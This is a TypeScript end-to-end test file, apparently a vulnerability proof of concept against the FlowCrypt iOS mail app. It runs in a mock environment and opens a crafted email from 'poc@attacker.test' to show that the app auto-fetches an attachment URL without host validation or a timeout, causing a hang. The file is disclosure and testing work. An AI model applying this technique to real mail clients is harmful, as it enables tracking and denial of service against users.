import { SplashScreen, SetupKeyScreen, MailFolderScreen, EmailScreen } from '../../../screenobjects/all-screens';

import { MockApi } from '../../../../api-mocks/mock';
import { MockApiConfig } from 'api-mocks/mock-config';

/**
 * POC: FlowCrypt iOS auto-fetches attachment URL from PGP message without host
 * validation (Finding 1) and has no fetch timeout (Finding 2 dos-hang).
 *
 * Mengikuti pola resmi ReadTextEmail.spec.ts: MockApi in-process HTTPS + cert install,
 * pesan POC di-inject via addGoogleMessage (file JSON sudah di-drop ke exported-messages
 * oleh gen_feed_v2.js sebelum suite jalan).
 */
const SUBJECT = process.env.CRAFTED_SUBJECT || 'POC attachment link F1';
const MODE = process.env.POC_MODE || 'f1';

describe('POC: ', () => {
  it(`${MODE}: ${SUBJECT}`, async () => {
    const mockApi = new MockApi();

    mockApi.fesConfig = MockApiConfig.defaultEnterpriseFesConfiguration;
    mockApi.ekmConfig = MockApiConfig.defaultEnterpriseEkmConfiguration;
    mockApi.addGoogleAccount('e2e.enterprise.test@flowcrypt.com', {
      messages: [SUBJECT as any],
    });

    await mockApi.withMockedApis(async () => {
      await SplashScreen.mockLogin();
      await SetupKeyScreen.setPassPhrase();
      await MailFolderScreen.checkInboxScreen();
      await MailFolderScreen.clickOnEmailBySubject(SUBJECT);
      // F1: app otomatis fetch attMeta.url -> muncul di mock server log (LoggedApi log)
      // F2: fetch hang -> UI hang di sini (timeout wdio = bukti hang)
      if (MODE === 'f2') {
        // dos-hang: tunggu sampai wdio timeout (default 20 mnt step timeout)
        await browser.pause(600000);
      } else {
        await EmailScreen.checkOpenedEmail('poc@attacker.test', SUBJECT, 'any');
      }
    });
  });
});
